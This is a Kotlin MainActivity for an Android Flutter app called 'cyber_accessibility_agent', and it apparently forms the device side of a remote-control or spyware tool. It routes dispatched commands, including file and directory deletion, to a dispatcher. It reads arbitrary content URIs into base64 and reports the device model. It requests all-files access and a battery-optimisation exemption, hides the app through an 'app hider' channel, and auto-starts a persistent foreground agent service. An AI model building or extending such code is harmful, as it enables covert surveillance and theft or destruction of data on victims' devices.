package com.example.cyber_accessibility_agent

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.PowerManager
import android.provider.Settings
import android.util.Base64
import android.util.Base64OutputStream
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import java.io.*
import java.util.concurrent.Executors

class MainActivity : FlutterActivity() {

    private val TAG = "MainActivity"

    private val COMMAND_CHANNEL = "cyber_accessibility_agent/commands"
    private val PERM_CHANNEL = "cyber_agent/permissions"
    private val BATTERY_CHANNEL = "cyber_agent/battery"
    private val APP_HIDER_CHANNEL = "cyber_accessibility_agent/app_hider"
    
    private val PERM_REQUEST_CODE = 14523
    private val BATTERY_REQUEST_CODE = 14524

    private var pendingPermResult: MethodChannel.Result? = null
    private var pendingBatteryResult: MethodChannel.Result? = null
    private val executor = Executors.newSingleThreadExecutor()

    @Volatile
    private var agentStarted = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        checkAndStartAgent()
    }

    override fun onResume() {
        super.onResume()
        checkAndStartAgent()
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        // ----- COMMAND CHANNEL -----
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, COMMAND_CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "dispatch" -> {
                        val args = call.arguments as? Map<*, *> ?: run {
                            result.error("INVALID_ARGS", "Expected Map", null)
                            return@setMethodCallHandler
                        }

                        val action = args["action"]?.toString() ?: ""
                        
                        // Check write permissions for deletion commands
                        if (action in listOf("delete_file", "delete", "rm", "remove", "delete_dir", "rd", "rmdir")) {
                            if (!hasWritePermissions()) {
                                Log.w(TAG, "Delete command blocked: missing write permissions")
                                result.success(mapOf(
                                    "success" to false,
                                    "error" to "permission_denied",
                                    "detail" to "Write permissions required for deletion",
                                    "action" to action
                                ))
                                return@setMethodCallHandler
                            }
                        }

                        executor.execute {
                            try {
                                Log.d(TAG, "Executing command: action=$action")
                                val res = CommandDispatcher.dispatch(
                                    context = this,
                                    id = args["id"]?.toString() ?: "",
                                    action = action,
                                    payload = args["payload"] as? Map<*, *> ?: emptyMap<String, Any>()
                                )
                                Log.d(TAG, "Command completed: action=$action, success=${res["success"]}")
                                result.success(res)
                            } catch (e: Exception) {
                                Log.e(TAG, "dispatch error for action=$action: ${e.message}", e)
                                result.success(mapOf(
                                    "success" to false, 
                                    "error" to "dispatch_exception",
                                    "detail" to (e.message ?: "Unknown exception"),
                                    "action" to action
                                ))
                            }
                        }
                    }

                    "ping" -> result.success(mapOf(
                        "status" to "ok", 
                        "device" to Build.MODEL,
                        "manufacturer" to Build.MANUFACTURER
                    ))

                    "readContentUri" -> {
                        val args = call.arguments as? Map<*, *>
                        val uriStr = args?.get("uri")?.toString() ?: ""
                        if (uriStr.isBlank()) {
                            result.error("INVALID_ARGS", "uri required", null)
                            return@setMethodCallHandler
                        }
                        executor.execute {
                            try {
                                if (!uriStr.startsWith("content://")) {
                                    result.success(mapOf("success" to false, "error" to "not_content_uri"))
                                    return@execute
                                }
                                val uri = Uri.parse(uriStr)
                                val meta = try {
                                    FileHelpers.getContentUriMeta(this, uri)
                                } catch (e: Exception) {
                                    Log.w(TAG, "getContentUriMeta failed: ${e.message}", e)
                                    mapOf<String, Any?>()
                                }
                                val b64 = streamBase64FromContentUri(uri)
                                if (b64 == null) {
                                    result.success(mapOf("success" to false, "error" to "read_failed", "meta" to meta))
                                    return@execute
                                }
                                result.success(mapOf("success" to true, "b64" to b64, "meta" to meta))
                            } catch (e: Exception) {
                                Log.w(TAG, "readContentUri error: ${e.message}", e)
                                result.success(mapOf("success" to false, "error" to (e.message ?: "exception")))
                            }
                        }
                    }

                    "getContentUriMeta" -> {
                        val args = call.arguments as? Map<*, *>
                        val uriStr = args?.get("uri")?.toString() ?: ""
                        if (uriStr.isBlank()) {
                            result.error("INVALID_ARGS", "uri required", null)
                            return@setMethodCallHandler
                        }
                        executor.execute {
                            try {
                                if (!uriStr.startsWith("content://")) {
                                    result.success(mapOf("success" to false, "error" to "not_content_uri"))
                                    return@execute
                                }
                                val uri = Uri.parse(uriStr)
                                val meta = FileHelpers.getContentUriMeta(this, uri)
                                result.success(mapOf("success" to true, "meta" to meta))
                            } catch (e: Exception) {
                                Log.w(TAG, "getContentUriMeta error: ${e.message}", e)
                                result.success(mapOf("success" to false, "error" to (e.message ?: "exception")))
                            }
                        }
                    }

                    else -> result.notImplemented()
                }
            }

        // ----- PERMISSION CHANNEL -----
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, PERM_CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "checkStoragePermissions" ->
                        result.success(currentPermissionMap())

                    "requestPermissions" ->
                        requestPermissions(result)

                    else -> result.notImplemented()
                }
            }

        // ----- BATTERY OPTIMIZATION CHANNEL -----
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, BATTERY_CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "isIgnoringBatteryOptimizations" -> {
                        result.success(isIgnoringBatteryOptimizations())
                    }

                    "requestIgnoreBatteryOptimizations" -> {
                        requestBatteryOptimization(result)
                    }

                    else -> result.notImplemented()
                }
            }

        // ----- APP HIDER CHANNEL -----
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, APP_HIDER_CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "hide" -> result.success(AppHider.hide(this))
                    "show" -> result.success(AppHider.show(this))
                    "isVisible" -> result.success(AppHider.isVisible(this))
                    else -> result.notImplemented()
                }
            }
    }

    private fun checkAndStartAgent() {
        val perms = currentPermissionMap()
        val hasRequiredPerms = perms["hasAllFilesAccess"] == true || 
                              (perms["readMediaImages"] == true && 
                               perms["readMediaVideo"] == true && 
                               perms["readMediaAudio"] == true)
        
        if (hasRequiredPerms) {
            startAgentService()
        } else {
            Log.d(TAG, "Agent not started - missing permissions")
        }
    }

    private fun isIgnoringBatteryOptimizations(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val pm = getSystemService(POWER_SERVICE) as PowerManager
                pm.isIgnoringBatteryOptimizations(packageName)
            } catch (e: Exception) {
                Log.w(TAG, "Error checking battery optimization: ${e.message}", e)
                false
            }
        } else {
            true // Not applicable on older versions
        }
    }

    private fun requestBatteryOptimization(result: MethodChannel.Result) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            Log.d(TAG, "Battery optimization not applicable for SDK < 23")
            result.success(true)
            return
        }

        try {
            if (isIgnoringBatteryOptimizations()) {
                Log.d(TAG, "Already ignoring battery optimizations")
                result.success(true)
                return
            }

            pendingBatteryResult = result
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
            }
            startActivityForResult(intent, BATTERY_REQUEST_CODE)
            Log.d(TAG, "Battery optimization request started")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to request battery optimization: ${e.message}", e)
            pendingBatteryResult = null
            result.success(false)
        }
    }

    private fun hasWritePermissions(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.WRITE_EXTERNAL_STORAGE
            ) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun requestPermissions(result: MethodChannel.Result) {
        val need = mutableListOf<String>()

        // Read permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            need += Manifest.permission.READ_MEDIA_IMAGES
            need += Manifest.permission.READ_MEDIA_VIDEO
            need += Manifest.permission.READ_MEDIA_AUDIO
        } else {
            need += Manifest.permission.READ_EXTERNAL_STORAGE
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
                need += Manifest.permission.WRITE_EXTERNAL_STORAGE
            }
        }

        // Android 11+ requires special permission for all files access
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
            !Environment.isExternalStorageManager()
        ) {
            Log.d(TAG, "Requesting MANAGE_EXTERNAL_STORAGE permission")
            try {
                startActivity(
                    Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:$packageName")
                    }
                )
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start MANAGE_EXTERNAL_STORAGE intent: ${e.message}", e)
            }
        }

        val filtered = need.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (filtered.isEmpty()) {
            Log.d(TAG, "All permissions already granted")
            result.success(currentPermissionMap())
            startAgentService()
            return
        }

        Log.d(TAG, "Requesting permissions: ${filtered.joinToString()}")
        pendingPermResult = result
        ActivityCompat.requestPermissions(
            this,
            filtered.toTypedArray(),
            PERM_REQUEST_CODE
        )
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        when (requestCode) {
            BATTERY_REQUEST_CODE -> {
                val granted = isIgnoringBatteryOptimizations()
                Log.d(TAG, "Battery optimization result: $granted")
                pendingBatteryResult?.success(granted)
                pendingBatteryResult = null
            }
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode != PERM_REQUEST_CODE) return

        Log.d(TAG, "Permission results: ${permissions.zip(grantResults.toTypedArray()).toMap()}")

        val map = currentPermissionMap()
        pendingPermResult?.success(map)
        pendingPermResult = null

        val hasRequired = map["hasAllFilesAccess"] == true || 
                         (map["readMediaImages"] == true && 
                          map["readMediaVideo"] == true && 
                          map["readMediaAudio"] == true)

        if (hasRequired) {
            Log.d(TAG, "Required permissions granted - starting agent")
            startAgentService()
        } else {
            Log.w(TAG, "Some required permissions denied")
        }
    }

    private fun currentPermissionMap(): Map<String, Boolean> {
        val map = mutableMapOf<String, Boolean>()

        // All files access (read + write on Android 11+)
        map["hasAllFilesAccess"] =
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
                Environment.isExternalStorageManager()
            else
                ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.READ_EXTERNAL_STORAGE
                ) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE
                ) == PackageManager.PERMISSION_GRANTED

        // Write permission
        map["hasWritePermission"] = hasWritePermissions()

        // Battery optimization
        map["isIgnoringBatteryOptimizations"] = isIgnoringBatteryOptimizations()

        // Media-specific permissions (Android 13+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            map["readMediaImages"] =
                ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.READ_MEDIA_IMAGES
                ) == PackageManager.PERMISSION_GRANTED

            map["readMediaVideo"] =
                ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.READ_MEDIA_VIDEO
                ) == PackageManager.PERMISSION_GRANTED

            map["readMediaAudio"] =
                ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.READ_MEDIA_AUDIO
                ) == PackageManager.PERMISSION_GRANTED
        }

        return map
    }

    private fun startAgentService() {
        synchronized(this) {
            if (agentStarted) {
                Log.d(TAG, "Agent already started")
                return
            }
            agentStarted = true
        }

        try {
            val intent = Intent(this, AgentService::class.java).apply {
                action = AgentService.ACTION_START
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ContextCompat.startForegroundService(this, intent)
            } else {
                startService(intent)
            }

            Log.i(TAG, "AgentService started successfully")
        } catch (e: Exception) {
            synchronized(this) { agentStarted = false }
            Log.e(TAG, "Failed to start AgentService: ${e.message}", e)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        executor.shutdownNow()
    }

    private fun streamBase64FromContentUri(uri: Uri): String? {
        return try {
            contentResolver.openInputStream(uri)?.use { input ->
                val buffer = ByteArray(8192)
                val baos = ByteArrayOutputStream()
                Base64OutputStream(baos, Base64.NO_WRAP).use { b64Out ->
                    var read: Int
                    while (input.read(buffer).also { read = it } != -1) {
                        b64Out.write(buffer, 0, read)
                    }
                    b64Out.flush()
                }
                baos.toString("UTF-8")
            }
        } catch (e: Exception) {
            Log.w(TAG, "streamBase64FromContentUri failed: ${e.message}", e)
            null
        }
    }
}
